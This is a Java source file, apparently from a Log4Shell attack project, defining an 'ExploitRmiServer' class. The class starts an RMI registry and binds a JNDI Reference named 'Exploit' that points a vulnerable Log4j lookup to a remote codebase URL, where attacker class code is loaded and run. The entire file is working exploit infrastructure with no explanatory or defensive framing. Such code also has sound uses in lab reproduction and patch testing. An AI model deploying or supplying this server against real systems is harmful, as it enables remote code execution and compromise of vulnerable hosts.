package com.example.log4shellattack2;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.Properties;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

public class ExploitRmiServer {

    public static void init(int port, String redirectUrl) {
        try {
            System.out.println("Starting RMI Server");
            Registry registry = LocateRegistry.createRegistry(port);
            Properties jndiProps = new Properties();
            jndiProps.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
            jndiProps.put(Context.PROVIDER_URL, "rmi://0.0.0.0:" + port);
            InitialContext context = new InitialContext(jndiProps);
            Reference reference = new Reference("Exploit", "Exploit",  redirectUrl);
            ReferenceWrapper wrapper = new ReferenceWrapper(reference);
            context.bind("Exploit", wrapper);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}
